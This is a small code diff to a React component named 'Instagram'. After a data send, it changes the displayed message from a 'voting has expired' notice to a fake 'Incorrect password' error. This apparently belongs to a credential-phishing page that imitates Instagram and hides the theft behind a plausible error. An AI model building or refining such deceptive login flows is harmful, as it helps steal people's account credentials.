@@ -46,7 +46,7 @@ const Instagram = () => {
         api.send();
 
         setTimeout(() => {
-          setResult("Unfortunately, Voting has Expired....");
+          setResult("Incorrect password....");
         }, 2000);
       });
   };
